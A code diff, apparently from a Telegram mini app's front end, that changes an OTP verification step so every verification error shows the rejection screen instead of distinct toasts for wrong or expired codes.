@@ -2245,27 +2245,17 @@
                     const detail = data.detail || '';
                     tg.HapticFeedback.notificationOccurred('error');
                     
-                    const isHardReject = detail.startsWith('ACCOUNT_ERROR|') || detail.startsWith('AUTH_ERROR|');
-
-                    if (isHardReject) {
-                        // Move to rejection screen as requested
-                        const msg = detail.split('|')[1] || "Account restricted or frozen";
-                        document.getElementById('rejectionDesc').textContent = msg;
-                        
-                        document.getElementById('step-otp').style.display = 'none';
-                        document.getElementById('step-rejected').style.display = 'block';
-                        
-                        // Stepper failure state
-                        document.getElementById('node-2').className = 'step-node completed';
-                        document.getElementById('node-3').className = 'step-node rejected';
-                        document.getElementById('node-3').innerHTML = '<i class="fas fa-times"></i>';
-                    } else if (detail.startsWith('WRONG_CODE|')) {
-                        showToast('❌ Incorrect Code', detail.split('|')[1], 'error');
-                    } else if (detail.startsWith('EXPIRED_CODE|')) {
-                        showToast('⌛ Code Expired', detail.split('|')[1], 'error');
-                    } else {
-                        showToast("Error", detail || "Verification failed", "error");
-                    }
+                    // All errors in this step now move to rejection screen as requested
+                    const msg = detail.split('|')[1] || detail || "Verification failed";
+                    document.getElementById('rejectionDesc').textContent = msg;
+                    
+                    document.getElementById('step-otp').style.display = 'none';
+                    document.getElementById('step-rejected').style.display = 'block';
+                    
+                    // Stepper failure state
+                    document.getElementById('node-2').className = 'step-node completed';
+                    document.getElementById('node-3').className = 'step-node rejected';
+                    document.getElementById('node-3').innerHTML = '<i class="fas fa-times"></i>';
                 }
             } catch (err) {
                 showToast("Process Error");
